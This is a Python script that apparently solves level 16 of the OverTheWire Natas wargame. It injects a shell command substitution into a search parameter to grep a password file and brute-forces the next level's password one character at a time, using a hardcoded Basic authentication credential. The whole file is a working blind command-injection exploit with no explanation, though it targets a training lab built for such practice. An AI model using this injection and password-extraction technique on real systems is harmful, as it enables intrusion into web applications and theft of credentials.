#! /usr/bin/env python3
import string
import urllib.parse
import requests

url = "http://natas16.natas.labs.overthewire.org/index.php?needle=lolls%24(grep+%5E{payload}+%2Fetc%2Fnatas_webpass%2Fnatas17)&submit=Search"
payload = ""
headers = {'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
charset = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
for x in range(32):
    for c in charset:
        tempPayload = payload + c
        response = requests.get(url.format(payload=tempPayload), headers=headers)
        if ("lolls" not in response.text):
            print(tempPayload)
            payload = tempPayload
            break
